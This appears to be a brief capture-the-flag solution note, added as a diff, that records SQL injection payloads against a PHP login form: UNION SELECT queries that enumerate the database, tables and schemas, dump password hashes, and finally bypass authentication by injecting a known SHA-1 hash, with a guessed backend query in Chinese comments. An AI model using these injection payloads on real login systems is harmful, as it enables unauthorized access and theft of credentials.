@@ -1,0 +1,34 @@
+username=admin'  union all select database(),2 -- &password=123
+login2
+
+username=admin'  union all select table_name,2 from information_schema.tables where table_schema='login2' limit 0,1 -- &password=
+Wrong password for users.
+
+columns
+username/password
+
+
+dump
+
+impossibletoguess
+1b2f190ad705d7c2afcac45447a31b053fada0c4
+356a192b7913b04c54574d18c28d46e6395428ab
+
+
+username=admin'  union all SELECT `SCHEMA_NAME`,2 FROM `information_schema`.`SCHEMATA`  limit 2,1 -- &password=12
+
+Wrong password for test
+
+这里猜测是这样的php语句
+
+$row = mysql_query('select * from users where username = \''$_GET['username']'\'')
+
+if(sha1($_GET['password']) == $row['password'])
+	echo flag;
+
+	
+构造 sha1(1) == '356a192b7913b04c54574d18c28d46e6395428ab'
+	即可成功
+
+username=admin' union all select 1,'356a192b7913b04c54574d18c28d46e6395428ab' -- &password=1
+
